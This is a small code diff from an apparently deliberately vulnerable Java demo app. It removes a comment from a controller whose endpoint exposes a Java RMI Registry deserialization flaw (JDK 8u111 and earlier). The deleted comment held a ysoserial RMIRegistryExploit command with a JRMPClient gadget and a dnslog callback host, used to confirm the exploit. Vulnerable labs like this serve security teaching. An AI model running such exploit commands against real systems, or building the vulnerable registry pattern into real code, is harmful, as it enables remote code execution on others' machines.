@@ -13,9 +13,7 @@ import java.rmi.registry.Registry;
 @RequestMapping("/Deserialize")
 public class RegistryVul {
 
-    /**
-     * 检测：java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit ip 9999 JRMPClient "rmi.c3blgk.dnslog.cn"
-     */
+
     @ApiOperation(value = "vul：Java RMI Registry 反序列化漏洞", notes = "<=jdk8u111")
     @RequestMapping("/rmi")
     public String rmi() {
